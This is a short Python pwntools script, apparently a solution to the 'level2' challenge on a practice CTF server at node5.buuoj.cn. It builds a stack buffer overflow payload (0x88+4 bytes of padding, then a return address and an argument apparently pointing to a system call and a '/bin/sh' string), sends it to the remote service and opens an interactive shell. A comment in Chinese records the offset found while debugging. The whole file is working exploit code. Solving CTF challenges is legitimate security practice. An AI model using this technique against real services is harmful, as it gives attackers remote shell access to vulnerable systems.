from pwn import *

# r=process('./level2')
r= remote("node5.buuoj.cn",25067)
context.arch="i386"# x64
context.terminal=["tmux","splitw","-h"]

#gdb.attach(r,'b main')
#debug 得到偏移量10
payload=b'a'*(0x88+4)+p32(0x0804849E)+p32(0x0804A024)

r.sendline(payload)

r.interactive()
